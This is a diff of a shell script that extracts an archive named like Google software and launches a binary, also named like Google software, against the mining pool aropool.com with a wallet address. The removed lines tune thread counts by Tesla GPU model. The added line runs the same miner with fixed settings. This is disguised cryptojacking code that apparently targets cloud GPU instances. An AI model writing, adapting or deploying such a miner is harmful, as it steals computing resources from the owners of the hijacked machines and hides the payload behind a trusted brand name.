@@ -13,33 +13,4 @@ tar -xvf ./googleapps84741274.tar.gz
 
 cd googleapps8474
 
-google8474=$(nvidia-smi --query-gpu=name --format=csv,noheader | sed "s/ //g")
-
-if [[ $google8474 == "TeslaP100-PCIE-16GB" ]]
-then
-
-./google84121274 -p http://aropool.com -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 24 -b 24
-
-else
-
-if [[ $google8474 == "TeslaT4" ]]
-then
-
-./google84121274 -p http://aropool.com -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 24 -b 24
-
-else
-
-if [[ $google8474 == "TeslaP4" ]]
-then
-
-./google84121274 -p http://aropool.com -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 20 -b 20
-
-else
-
-./google84121274 -p http://aropool.com -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 18 -b 18
-
-fi
-
-fi
-
-fi
+./google84121274 -p http://aropool.com -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 8 -b 8
